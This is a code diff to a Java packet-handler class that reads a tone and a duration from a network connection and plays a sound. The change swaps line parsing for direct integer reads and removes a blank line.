@@ -7,13 +7,12 @@ import javax.sound.sampled.SourceDataLine;
 import com.redpois0n.Connection;
 import com.redpois0n.Note;
 
-
 public class PacketCPIA extends AbstractPacket {
 
 	@Override
 	public void read(String line) throws Exception {
-		int tone = Integer.parseInt(Connection.readLine());
-		int time = Integer.parseInt(Connection.readLine());
+		int tone = Connection.readInt();
+		int time = Connection.readInt();
 		AudioFormat af = new AudioFormat(Note.SAMPLE_RATE, 8, 1, true, true);
 		SourceDataLine dl = AudioSystem.getSourceDataLine(af);
 		dl.open(af, Note.SAMPLE_RATE);
